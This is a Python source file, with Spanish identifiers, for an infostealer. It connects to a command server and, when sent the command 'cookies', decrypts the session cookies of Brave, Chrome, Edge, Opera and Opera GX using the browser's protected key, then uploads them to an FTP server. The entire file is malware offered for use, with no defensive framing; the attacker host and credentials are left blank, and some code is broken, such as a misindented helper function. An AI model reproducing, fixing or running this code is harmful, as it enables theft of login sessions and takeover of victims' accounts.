import socket, os, tempfile, sqlite3, json
from ftplib import FTP
from base64 import b64decode
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES

temp = tempfile.mkdtemp()
nombre = os.getlogin()

host =
port = 1337

ftp_user = 
ftp_pass = 

ftp = FTP()
ftp.login(ftp_user, ftp_pass)

def carpeta():
    try:
        ftp.cwd("cliente")
        ftp.mkd(f"{nombre}")
    except:
        pass
    try:
        ftp.cwd(f"{nombre}")
    except:
        pass

cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def cookies():
    def clave(archivo):
    with open(archivo, "r", encoding="utf-8") as local_archivo:
        read_local = local_archivo.read()
    local_state = json.loads(read_local)
    clave = b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = clave[5:]
    encrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return encrypted_key

    def decrypt_valor(valor, clave):
        iv = valor[3:15]
        payload = valor[15:]
        cifrado = AES.new(clave, AES.MODE_GCM, iv)
        desencriptar_clave =  cifrado.decrypt(payload)
        desencriptar_clave = desencriptar_clave[:-16]
        return desencriptar_clave.decode('utf-8')

    def brave():
        carpeta = f"{os.getenv('localappdata')}\\BraveSoftware\\Brave-Browser\\User Data"
        if os.path.exists(carpeta):
            local_state = carpeta + os.sep + "Local State"
            if os.path.isfile(local_state):
                clave2 = clave(local_state)
                pass
            else:
                print("Local State no existe")   
                exit(0)
            cookies = carpeta + os.sep + "Default" + os.sep + "Network" + os.sep + "Cookies"
            if os.path.isfile(cookies):
                pass
            else:
                exit(0)
            sql = sqlite3.connect(cookies)
            orden = sql.cursor()
            orden.execute("SELECT name, encrypted_value, host_key, expires_utc, is_httponly, is_secure, samesite, is_same_party, top_frame_site_key, priority FROM cookies")
            with open(f"{temp}{os.sep}brave({nombre})", "a", encoding="cp437", errors="ignore") as archivo_cookies:
                for cookies in orden.fetchall():
                    nombre = cookies[0]
                    valor = decrypt_valor(cookies[1], clave2)
                    domain = cookies[2]
                    expiracion = cookies[3]
                    httponly = cookies[4]
                    secure = cookies[5]
                    samesite = cookies[6]
                    sameparty = cookies[7]
                    partition_key = cookies[8]
                    prioridad = cookies[9]
                    archivo_cookies.write(f"SITIO: {domain}\n Name: {nombre}\n Value: {valor}\n Domain: {domain}\n Expire: {expiracion}\n HttpOnly: {httponly}\n Secure: {secure}\n SameSite: {samesite}\n SameParty: {sameparty}\n Partition Key: {partition_key}\n Priority: {prioridad}\n\n")
                    try:
                        ftp.storlines('STOR ' + f"brave({nombre})", archivo_cookies)
                        cliente.send("BRAVE: EXITO!".encode('utf-8'))
                    except:
                        cliente.send("BRAVE: ERROR".encode('utf-8'))
                orden.close()
                sql.close()

    def chrome():
        carpeta = f"{os.getenv('localappdata')}\\Google\\Chrome\\User Data\\"
        if os.path.exists(carpeta):
            local_state = carpeta + os.sep + "Local State"
            if os.path.isfile(local_state):
                clave2 = clave(local_state)
                pass
            else:
                print("Local State no existe")   
                exit(0)
            cookies = carpeta + os.sep + "Default" + os.sep + "Network" + os.sep + "Cookies"
            if os.path.isfile(cookies):
                pass
            else:
                exit(0)
            sql = sqlite3.connect(cookies)
            orden = sql.cursor()
            orden.execute("SELECT name, encrypted_value, host_key, expires_utc, is_httponly, is_secure, samesite, is_same_party, top_frame_site_key, priority FROM cookies")
            with open(f"{temp}{os.sep}chrome({nombre})", "a", encoding="cp437", errors="ignore") as archivo_cookies:
                for cookies in orden.fetchall():
                    nombre = cookies[0]
                    valor = decrypt_valor(cookies[1], clave2)
                    domain = cookies[2]
                    expiracion = cookies[3]
                    httponly = cookies[4]
                    secure = cookies[5]
                    samesite = cookies[6]
                    sameparty = cookies[7]
                    partition_key = cookies[8]
                    prioridad = cookies[9]
                    archivo_cookies.write(f"SITIO: {domain}\n Name: {nombre}\n Value: {valor}\n Domain: {domain}\n Expire: {expiracion}\n HttpOnly: {httponly}\n Secure: {secure}\n SameSite: {samesite}\n SameParty: {sameparty}\n Partition Key: {partition_key}\n Priority: {prioridad}\n\n")
                    try:
                        ftp.storlines('STOR ' + f"chrome({nombre})", archivo_cookies)
                        cliente.send("CHROME: EXITO!".encode('utf-8'))
                    except:
                        cliente.send("CHROME: ERROR".encode('utf-8'))
                orden.close()
                sql.close()

    def Edge():
        carpeta = f"{os.getenv('localappdata')}\\Microsoft\\Edge\\User Data"
        if os.path.exists(carpeta):
            local_state = carpeta + os.sep + "Local State"
            if os.path.isfile(local_state):
                clave2 = clave(local_state)
                pass
            else:
                print("Local State no existe")   
                exit(0)
            cookies = carpeta + os.sep + "Default" + os.sep + "Network" + os.sep + "Cookies"
            if os.path.isfile(cookies):
                pass
            else:
                exit(0)
            sql = sqlite3.connect(cookies)
            orden = sql.cursor()
            orden.execute("SELECT name, encrypted_value, host_key, expires_utc, is_httponly, is_secure, samesite, is_same_party, top_frame_site_key, priority FROM cookies")
            with open(f"{temp}{os.sep}edge({nombre})", "a", encoding="cp437", errors="ignore") as archivo_cookies:
                for cookies in orden.fetchall():
                    nombre = cookies[0]
                    valor = decrypt_valor(cookies[1], clave2)
                    domain = cookies[2]
                    expiracion = cookies[3]
                    httponly = cookies[4]
                    secure = cookies[5]
                    samesite = cookies[6]
                    sameparty = cookies[7]
                    partition_key = cookies[8]
                    prioridad = cookies[9]
                    archivo_cookies.write(f"SITIO: {domain}\n Name: {nombre}\n Value: {valor}\n Domain: {domain}\n Expire: {expiracion}\n HttpOnly: {httponly}\n Secure: {secure}\n SameSite: {samesite}\n SameParty: {sameparty}\n Partition Key: {partition_key}\n Priority: {prioridad}\n\n")
                    try:
                        ftp.storlines('STOR ' + f"edge({nombre})", archivo_cookies)
                        cliente.send("EDGE: EXITO!".encode('utf-8'))
                    except:
                        cliente.send("EDGE: ERROR".encode('utf-8'))
                orden.close()
                sql.close()

    def Opera():
        carpeta = f"{os.getenv('appdata')}\\Opera Software\\Opera Stable"
        if os.path.exists(carpeta):
            local_state = carpeta + os.sep + "Local State"
            if os.path.isfile(local_state):
                clave2 = clave(local_state)
                pass
            else:
                print("Local State no existe")   
                exit(0)
            cookies = carpeta + os.sep + "Network" + os.sep + "Cookies"
            if os.path.isfile(cookies):
                pass
            else:
                exit(0)
            sql = sqlite3.connect(cookies)
            orden = sql.cursor()
            orden.execute("SELECT name, encrypted_value, host_key, expires_utc, is_httponly, is_secure, samesite, is_same_party, top_frame_site_key, priority FROM cookies")
            with open(f"{temp}{os.sep}opera({nombre})", "a", encoding="cp437", errors="ignore") as archivo_cookies:
                for cookies in orden.fetchall():
                    nombre = cookies[0]
                    valor = decrypt_valor(cookies[1], clave2)
                    domain = cookies[2]
                    expiracion = cookies[3]
                    httponly = cookies[4]
                    secure = cookies[5]
                    samesite = cookies[6]
                    sameparty = cookies[7]
                    partition_key = cookies[8]
                    prioridad = cookies[9]
                    archivo_cookies.write(f"SITIO: {domain}\n Name: {nombre}\n Value: {valor}\n Domain: {domain}\n Expire: {expiracion}\n HttpOnly: {httponly}\n Secure: {secure}\n SameSite: {samesite}\n SameParty: {sameparty}\n Partition Key: {partition_key}\n Priority: {prioridad}\n\n")
                    try:
                        ftp.storlines('STOR ' + f"opera({nombre})", archivo_cookies)
                        cliente.send("OPERA: EXITO!".encode('utf-8'))
                    except:
                        cliente.send("OPERA: ERROR".encode('utf-8'))
                orden.close()
                sql.close()

    def OperaGX():
        carpeta = f"{os.getenv('appdata')}\\Opera Software\\Opera GX Stable"
        if os.path.exists(carpeta):
            local_state = carpeta + os.sep + "Local State"
            if os.path.isfile(local_state):
                clave2 = clave(local_state)
                pass
            else:
                print("Local State no existe")   
                exit(0)
            cookies = carpeta + os.sep + "Network" + os.sep + "Cookies"
            if os.path.isfile(cookies):
                pass
            else:
                exit(0)
            sql = sqlite3.connect(cookies)
            orden = sql.cursor()
            orden.execute("SELECT name, encrypted_value, host_key, expires_utc, is_httponly, is_secure, samesite, is_same_party, top_frame_site_key, priority FROM cookies")
            with open(f"{os.getcwd()}{os.sep}operaGX({nombre})", "a", encoding="cp437", errors="ignore") as archivo_cookies:
                for cookies in orden.fetchall():
                    nombre = cookies[0]
                    valor = decrypt_valor(cookies[1], clave2)
                    domain = cookies[2]
                    expiracion = cookies[3]
                    httponly = cookies[4]
                    secure = cookies[5]
                    samesite = cookies[6]
                    sameparty = cookies[7]
                    partition_key = cookies[8]
                    prioridad = cookies[9]
                    archivo_cookies.write(f"SITIO: {domain}\n Name: {nombre}\n Value: {valor}\n Domain: {domain}\n Expire: {expiracion}\n HttpOnly: {httponly}\n Secure: {secure}\n SameSite: {samesite}\n SameParty: {sameparty}\n Partition Key: {partition_key}\n Priority: {prioridad}\n\n")
                    try:
                        ftp.storlines('STOR ' + f"operaGX({nombre})", archivo_cookies)
                        cliente.send("OPERAGX: EXITO!".encode('utf-8'))
                    except:
                        cliente.send("OPERAGX: ERROR".encode('utf-8'))
                orden.close()
                sql.close()

def escuchando():
    while True:
        peticion = cliente.recv(1024).decode('utf-8')
        if peticion == 'cookies':
            cookies()

def main():
    cliente.connect((host,port))
    while True:
        escuchando()

main()
